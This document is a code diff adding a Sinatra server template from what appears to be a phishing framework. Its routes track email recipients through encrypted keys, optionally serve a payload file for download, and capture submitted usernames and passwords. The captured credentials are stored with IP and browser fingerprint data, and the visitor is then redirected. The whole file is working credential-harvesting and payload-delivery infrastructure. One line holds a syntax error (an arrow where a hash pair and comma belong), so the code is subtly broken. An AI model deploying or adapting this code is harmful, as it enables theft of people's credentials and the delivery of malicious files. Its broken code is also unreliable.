@@ -1,0 +1,147 @@
+class <%= self[:webserver] %> < Sinatra::Base
+	
+	not_found do
+		puts "#{Time.now} - IP #{request.ip} PORT #{request.port} - #{request.forwarded?} - #{request.user_agent}" 
+		erb :error
+	end
+
+	get "/image" do
+		process_info(params,request)
+		return_img
+	end
+
+  get "/click" do
+  	process_info(params,request)
+		redirect to params[:url] || "<%= self[:url] %>" 
+	end
+	<% if self[:payload] %>
+	
+	get "/download" do
+		process_info(params, request)
+		return_payload
+	end
+
+	<% end %>
+	get "/" do 
+		process_info(params,request)
+		erb :index
+	end
+	<% if self[:url_route] != "/" && self[:url_route] != "" %>
+
+	get <%= self[:url_route] %> do
+		process_info(params,request)
+		erb :index
+	end
+
+	<% end %>
+	<% self[:forms_routes].each do |route| %>
+	<%= route[0] %> "<%=route[1]%>" do
+		puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
+		process_info(params,request)
+		process_cred(params,request)
+
+		redirect to "<%= self[:url] %>"
+	end
+	<% end %>
+
+	private
+	<% if self[:payload] %>
+	def return_payload
+		return send_file(<%= self[:payload] %>, :disposition => :attachment)
+	end
+	
+	<% end %>
+	def return_img
+		return send_file(File.expand_path("../../../data/images/image.jpg", __FILE__), 
+			:filename => "white.jpg", 
+			:type => :jpg, 
+			:disposition => :inline)
+	end
+
+	def process_cred(params,request)
+
+		ua = Cartero::UserAgentParser.new(request.user_agent)
+		ua.parse
+
+		creds = Credential.new(
+			:ip 				=> request.ip,
+			:port 			=> request.port,
+			:domain			-> request.host
+			:path       => request.path_info,
+			:time 			=> Time.now,
+			:user_agent => request.user_agent,
+			:forwarded 	=> request.forwarded?,
+			:data 			=> params,
+			:ua_comp		=> ua.comp,
+			:ua_os 			=> ua.os,
+			:ua_browser => ua.browser,
+			:ua_engine	=> ua.engine,
+			:ua_platform => ua.platform,
+			:ua_lang		=> ua.lang,
+			:username		=> params[:username] || params[:email],
+			:password		=> params[:password]
+		)
+		creds.save!
+	end
+
+	def process_info(params,request)
+		if params[:key]
+			begin
+				data = JSON.parse(Cartero::CryptoBox.decrypt(params[:key]),{:symbolize_names => true})
+			rescue RbNaCl::CryptoError
+				puts "Entity Could not be decrypt it."
+			rescue ArgumentError
+				puts "Entity Could not be parsed correctly."
+			end
+
+			person = Person.where(:email => data[:email]).first
+
+			if person.nil?
+				begin 
+					person = Person.new(:email => data[:email])
+					person.save!
+				rescue MongoMapper::DocumentNotValid
+					person = Person.where(:email => data[:email]).first
+				end
+			end
+			
+			person.campaigns << data[:subject] unless person.campaigns.include?(data[:subject])
+			person.responded << "#{request.ip}:#{request.port}" unless person.responded.include?("#{request.ip}:#{request.port}")
+			if params[:username] || params[:password]
+				person.credentials << { 
+					:username => params[:username], 
+					:password => params[:password]
+				}
+			end
+
+			ua = Cartero::UserAgentParser.new(request.user_agent)
+			ua.parse
+
+			person.hits << Hit.new(
+				:ip 				=> request.ip,
+				:port 			=> request.port,
+				:domain 		=> request.host,
+				:path       => request.path_info,
+				:ports 			=> data[:ports],
+				:time 			=> Time.now,
+				:user_agent => request.user_agent,
+				:forwarded 	=> request.forwarded?,
+				:data 			=> data,
+				:ua_comp		=> ua.comp,
+				:ua_os 			=> ua.os,
+				:ua_browser => ua.browser,
+				:ua_engine	=> ua.engine,
+				:ua_platform => ua.platform,
+				:ua_lang		=> ua.lang
+			)
+
+			person.save!
+			puts "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
+		else
+			puts "#{Time.now} - PERSON #{"--"} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
+
+		end
+	end
+end
+
+
